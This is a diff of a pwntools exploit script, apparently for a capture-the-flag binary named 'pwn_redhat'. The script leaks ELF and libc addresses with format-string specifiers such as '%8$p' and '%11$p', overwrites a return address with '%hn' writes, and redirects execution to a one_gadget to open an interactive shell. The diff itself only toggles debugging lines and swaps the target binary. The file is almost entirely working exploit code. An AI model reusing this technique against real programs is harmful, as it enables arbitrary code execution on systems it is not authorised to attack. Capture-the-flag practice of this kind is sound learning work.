@@ -12,7 +12,8 @@ if sys.argv[1] == "l":
     context.log_level = "debug"
     # env = {'LD_PRELOAD': ''}
     # io = process("", env = env)
-    io = process("./pwn_redhat")
+    #  io = process("./pwn_redhat")
+    io = process("./pwn_redhat_patch_printf")
     libc = elf.libc
 
 
@@ -26,7 +27,7 @@ def DEBUG(cmd = ""):
     gdb.attach(io, cmd)
 
 if __name__ == "__main__":
-    #  DEBUG()
+    DEBUG()
     io.sendlineafter(">>>", "%8$p..%9$p..%11$p..")
     elfBase = int(io.recvuntil("..", drop = True), 16) - 0x13C0
     success("elfBase -> {:#x}".format(elfBase))
@@ -39,14 +40,13 @@ if __name__ == "__main__":
     pause()
 
     payload = "%{}c%11$hn".format(retAddr & 0xffff)
-    #  DEBUG()
     io.sendlineafter(">>>", payload)
 
     #  DEBUG()
     #  io.sendlineafter(">>>", "%36$p.%37$p.%38$p")
     oneGadget = 0x3f32a + libc.address
     payload = "%{}c%37$hn".format(oneGadget & 0xffff)
-    DEBUG()
+    #  DEBUG()
     io.sendlineafter(">>>", payload)
 
     io.interactive()
